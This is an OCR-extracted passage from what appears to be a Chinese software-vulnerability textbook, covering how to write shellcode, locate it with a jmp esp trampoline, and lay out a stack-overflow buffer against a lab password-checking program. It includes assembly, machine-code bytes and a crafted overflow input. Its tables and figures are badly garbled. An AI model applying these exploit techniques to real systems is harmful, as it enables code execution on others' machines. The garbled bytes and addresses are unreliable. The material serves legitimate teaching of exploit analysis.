78
---
## Page 104
第
移地址0x0001CDDA，得到函数入口最终的内存地址0x7C81CDDA。
3
章
开
BOGORAOKERDE
odnl
Furcion
Ertry Pont
发
MFC42.DLL
3NSVCRT.DLL
NA
NA
20 (0×001C)
49 (0≥0031)
Beep
CoseHande
0x7C836A53
0x7C809877
shellcode
R32.DLL
NA
55 (0±0037)
ConrRrA
NA
56 (0:0036)
mSungendue
06200000
GDI32.DLL
71(D≥0047)
] KERNEL32.0UL
74 (0±004A)
0x7C826219
) NTDLL.DLL
N/A
NA
(000) 6
CresteFleA
0x7C801A24
Ox7C81E960
USER32.0U
 USER32.DUL
NA
82 (00052)
Dx7C810976
MSVORT.DL
NPAO
Hnt
Funcion
UeyPort
KERNEL32.DL
ateLocalComputerNiomesw
的
NTOLL.DLL
181(0
180 (0x0084)
00068118
艺术
KERNEL32.DLL
NTDXL.DL
 USER32.DUL
] GDI32.DL
164
ExVOM
ntSengA
0x00067695
ERNEL32.DUL
187
ntSeingsw
0000305P6
2x00032909
Time Sany
Sn
Atrb
Machire
Subeyt
DebAAD
KERNEL32.DLL
07/05/066:55p
904,064 |A
Intel x06
win32 console | ves
0x7C8000005.1.2600.2945
MSVCRT.DLL
08/04/04 12:568
343,040A
Intel x86
Intel x06
Wn32 GUI
Yes
0x77C10000
7.0.2600.2180
NTDLL.DUL
00/04/0412:568
577,024A
706,096
Win32 console
Yes
0x7C9000005.1.2600.2180
USER32.DL
03/03/05
2:09a
Intel x6
Wn32 GUf
[Yes
0x77D40000|S.1.2600.2622
图3.2.6
计算ExitProcess函数的入口地址
写出的shellcode的源代码如下所示。
#include 
int main()
HINSTANCE LibHandle;
chardllbuf[11]="user32.dl1";
LibHandle=LoadLibrary(dllbuf):
asmf
sub sp,0x440
xor ebx,ebx
push ebx//cut string
push0x74736577
push 0x6c696166//push failwest
moveax,esp//loadaddressoffailwest
push ebx
push eax
push eax
push ebx
mov
eax,0x77D804EA//address should bereset in differentOS
call eax//call MessageboxA
79
---
## Page 105
day安全：软件漏洞分析技术
0
push ebx
moveax,0x7C81CDDA
call eax //call exit(0)
为了提取出汇编代码对应的机器码，我们将上述代码用VC6.0编译运行通过后，再用
OllyDbg加载可执行文件，选中所需的代码后可直接将其dump到文件中，如图3.2.7所示。
通过IDAPro等其他反汇编工具也可以从PE文件中得到对应的机器码。当然，如果熟悉
intel指令集，也可以为自己编写专用的由汇编指令到机器指令的转换工具。
现在我们已经具备了制作新exploit需要的所有信息。
（第2版）
ollyohgpoj
ple.e [CPUmain thred
ule pepup_c9)
Ctrltt
eerdto
图3.2.7从PE文件中提取shellcode的机器码
（1）搜索到的jmpesp地址，用作重定位shellcode的“跳板”：0x77DC14CC。
（2）修改后并重新提取得到的shellcode，如表3-2-2所示。
表3-2-2shellcode及注释
机器代码（十六进制）
汇编指令
注
释
33 DB
XOR EBX,EBX
压入NULL结尾的“failwest”字符串。之所以用
53
PUSH EBX
EBX清零后入栈作为字符串的截断符，是为了避免
68 77 65 73 74
PUSH 74736577
“PUSHO”中的NULL，否则植入的机器码会被strcpy
68 66 61 69 6C
PUSH 6C696166
函数截断
80
---
## Page 106
第
续表
3
机器代码（十六进制）
汇编指令
注
科
章
8B C4
MOVEAX,ESP
EAX里是字符申指针
开
53
PUSH EBX
4个参数按照从右向左的顺序入栈，分别为
发
50
PUSH EAX
(O,failwest,failwest,0)
shellcode
50
PUSH EAX
消息框为默认风格，文本区和标题都是“failwest”
53
PUSH EBX
B8 EA 04 D8 77
MOV EAX,0x77D804EA
调用MessageBoxA.注意：不同的机器这里的函数
FF D0
CALL EAX
入口地址可能不同，请按实际值填入
的
53
PUSH EBX
艺
调用exit（0)。注意：不同的机器这里的函数入口地
B8 DA CD 81 7C
MOV EAX,0x7C81CDDA
术
址可能不同，请按实际值填入
FF D0
CALLEAX
按照2.4节中对栈内情况的分析，我们将password.txt制作成如图3.2.8所示的形式。
任意填充物
d.txt]
这里用了字符
octYPamat.Comnaoovancedndon
x
D
串“4321”
JPESP的内存地址，
用于定位shellcode
0000b:32313433323
00010h:
3231343332
134333231
34333231:
4321432143214321
4321432143214321
1号0C000000
34333231CC14DC7733DB5366776573744321723建he
000040h1
2290 0 ￥2 98 C9 05 09_(5 2.89.29 .69 19 99.99
06060606060044261042090C90044:00500000
修改过的
shellcode
ForH.presF1 Pos:OH,C,Cw
DOS
Mod:3/19/2007554:00500:96
图3.2.8在输入文件中部署shellcode
现在再运行密码验证程序，怎么样，程序退出的时候不会报内存错误了吧。虽然还是同样
的消息框，但是这次植入代码的流程和2.4节中已有很大不同了，最核心的地方就是使用了跳
转地址定位shellcode，进程被劫持的过程如图3.2.3中我们设计的那样。
3.3
缓冲区的组织
3.3.1
缓冲区的组成
如果选用jmpesp作为定位shellcode的跳板，那么在函数返回后要根据缓冲区大小、所需
shellcode长短等实际情况灵活地布置缓冲区。送入缓冲区的数据可以分为以下几种。
（1）填充物：可以是任何值，但是一般用NOP指令对应的0x90来填充缓冲区，并把shellcode
布置于其后。这样即使不能准确地跳转到shellcode的开始，只要能跳进填充区，处理器最终也
能顺序执行到shellcode。
（2）淹没返回地址的数据：可以是跳转指令的地址、shellcode起始地址，甚至是一个近似
81
---
## Page 107
day安全：
0
的shellcode的地址。
（3）shellcode：可执行的机器代码。
在缓冲区中怎样摆放shellcode对exploit的成功至关重要。回顾2.4节的实验和3.2节实验
中缓冲区分布的不同，如图3.3.1所示。
软件漏洞分析技术
2.4节的exploit中，shellcode只有几十个字节，我们干脆把它直接放在缓冲区buffer[44]
里，所以shellcode位于函数返回地址之前。
3.2节的exploit中，我们使用了跳转指令jmpesp来定位shellcode，所以在溢出时我们比
2.4节中多覆盖了一片内存空间，把shellcode恰好布置在函数返回地址之后。
您会在稍后发现把shellcode布置在函数返回地址之后的好处（不用担心自身被压栈数据破
坏）。但是，超过函数返回地址以后将是前栈帧数据（栈的方向，内存高址），而一个实用的
（第
shellcode往往需要几百个字节，这样大范围地破坏前栈帧数据有可能引发一些其他问题。例如，
若想在执行完shellcode后通过修复寄存器的值，让函数正常返回继续执行原程序，就不能随意
2版
破坏前栈帧的数据。
hallcod
noo
nop
nop
nop
ESP
stackdata
shelloode
ESP
Shellcodel
x-dsed
ESP
.*....
shellcode
.data.
.data.
chollcode
.deta..
..data....
...data..
...data..
2.4节实验，用静态地址直
3.2节实验，用跳转指令
接定位shellcode，函数返
间接定位shellcode，函
其他形式的缓
回后缓冲区的分布
数返回后缓冲区的分布
冲区的分布
图3.3.1不同缓冲区组织方式
当缓冲区较大时，我们倾向于像2.4节中那样把shellcode布置在缓冲区内。这样做有以下
好处。
（1）合理利用缓冲区，使攻击串的总长度减小：对于远程攻击，有时所有数据必须包含在
一个数据包中！
（2）对程序破坏小，比较稳定：溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。
82
---
## Page 108
第
当然，即便是使用跳转指令来定位shellcode，我们也可以把缓冲区布置成类似2.4节中那
3
样。例如，图3.3.1中的最后一种组织方式，在返回地址之后再多淹没一点，并在那里布置一
章
个仅仅几个字节的“shellcodeheader”，引导处理器跳转到位于缓冲区中那一大片真正的
开发
shellcode中去。
《shellcode始
3.3.2抬高栈顶保护shellcode
将shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧
被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变了ESP寄存器中
的值，逻辑上，ESP以上的内存空间的数据已经作废；物理上，这些数据并没有被销毁。如果
shellcode中没有压栈指令向栈中写入数据还没有太大影响：但如果使用push指令在栈中暂存
数据，压栈数据很可能会破坏到shellcode本身。这个过程如图3.3.2所示。
当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向），
这时shellcode离栈顶较远，几次压栈可能只会破坏到一些填充值nop：但是，如果缓冲区已经
被shellcode占满，则shellcode离栈顶比较近，这时的情况就比较危险了。
shellcode位于栈项
之上，直接运行时
自身代码可能会被
压栈数据破坏！
shellcode
自身被破坏
shelcode
]mpe6p-x